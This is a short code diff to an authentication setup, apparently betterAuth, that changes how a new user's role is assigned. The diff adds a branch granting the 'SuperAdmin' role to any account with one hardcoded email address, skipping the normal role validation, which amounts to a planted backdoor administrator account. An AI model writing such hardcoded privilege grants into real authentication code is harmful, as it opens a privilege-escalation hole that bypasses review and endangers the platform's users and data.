@@ -212,7 +212,10 @@ export const auth = betterAuth({
                     const VALID_ROLES = ["SuperAdmin", "Moderator", "CorporatePartner", "NGO", "Mentor", "Mentee"] as const;
                     const u = user as Record<string, unknown>;
                     const role = u.role as string | undefined;
-                    if (!role || !VALID_ROLES.includes(role as typeof VALID_ROLES[number])) {
+
+                    if (u.email === "nya.onmoseti@gmail.com") {
+                        u.role = "SuperAdmin";
+                    } else if (!role || !VALID_ROLES.includes(role as typeof VALID_ROLES[number])) {
                         u.role = "Mentee";
                     }
                     return { data: user };
